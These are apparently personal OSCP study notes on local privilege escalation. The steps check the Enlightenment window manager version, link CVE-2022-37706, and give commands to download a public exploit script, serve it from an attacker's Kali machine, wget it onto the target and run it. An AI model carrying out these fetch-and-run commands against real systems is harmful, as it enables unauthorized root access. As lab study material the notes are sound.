Enlightenment --version

Find version number and google CVE

Version 0.23.1 
[CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main)

```
wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
```

```
python3 -m http.server 8000
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}/exploit.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
bash exploit.sh
```

